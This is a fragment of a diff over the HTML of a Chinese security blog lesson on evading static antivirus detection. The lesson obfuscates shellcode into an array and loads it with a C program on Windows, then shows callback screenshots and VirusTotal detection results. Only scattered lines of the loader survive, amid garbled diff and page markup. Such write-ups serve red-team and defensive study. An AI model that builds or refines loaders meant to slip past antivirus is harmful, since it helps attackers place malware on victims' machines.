-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
+</span></span></code></pre></div><p>编译成功后，运行：</p><p><img src=https://images.payloads.online/787a6f56-4f5f-11ec-9d50-00d861bf4abb.png alt=2019-11-10-02-02-56></p><p>V站查杀结果：</p><p><img src=https://images.payloads.online/78b7773e-4f5f-11ec-8904-00d861bf4abb.png alt=2019-11-10-02-03-07></p><p><a href=https://www.virustotal.com/gui/file/00b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0/detection>https://www.virustotal.com/gui/file/00b0fe741923838b5757281e2ea37c0732c88443a8a4730f384371d8a8b0c2b0/detection</a></p><p>这个效果已经很好，但是我想要更好。</p><h2 id=0x04-实现一次混淆加载>0x04 实现一次混淆加载</h2><p>使用之前的Python脚本混淆生成RAW文件，最后得到混淆后的数组：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#75715e>// 入口函数
@@ -193,4 +161,4 @@
 </span></span><span style=display:flex><span><span style=color:#a6e22e>WaitForSingleObject</span>(hThread,INFINITE); <span style=color:#75715e>// 一直等待线程执行结束
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>上线效果：</p><p><img src=https://images.payloads.online/78fce80a-4f5f-11ec-a6b7-00d861bf4abb.png alt=2019-11-10-02-03-50></p><p><img src=https://images.payloads.online/793e3152-4f5f-11ec-ab6c-00d861bf4abb.png alt=2019-11-10-02-03-57></p><p>V站查杀：</p><p><img src=https://images.payloads.online/7978f5e4-4f5f-11ec-9c15-00d861bf4abb.png alt=2019-11-10-02-04-08></p><p><a href=https://www.virustotal.com/gui/file/a12105a78ccc3228bae12c170782c71b8212bd44e65f519947c6136f17e04723/detection>https://www.virustotal.com/gui/file/a12105a78ccc3228bae12c170782c71b8212bd44e65f519947c6136f17e04723/detection</a></p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>
+</span></span></code></pre></div><p>上线效果：</p><p><img src=https://images.payloads.online/78fce80a-4f5f-11ec-a6b7-00d861bf4abb.png alt=2019-11-10-02-03-50></p><p><img src=https://images.payloads.online/793e3152-4f5f-11ec-ab6c-00d861bf4abb.png alt=2019-11-10-02-03-57></p><p>V站查杀：</p><p><img src=https://images.payloads.online/7978f5e4-4f5f-11ec-9c15-00d861bf4abb.png alt=2019-11-10-02-04-08></p><p><a href=https://www.virustotal.com/gui/file/a12105a78ccc3228bae12c170782c71b8212bd44e65f519947c6136f17e04723/detection>https://www.virustotal.com/gui/file/a12105a78ccc3228bae12c170782c71b8212bd44e65f519947c6136f17e04723/detection</a></p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2019-11-10/3/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>静态恶意代码逃逸（第三课）</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2019-11-10/5/><span>静态恶意代码逃逸（第五课）</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
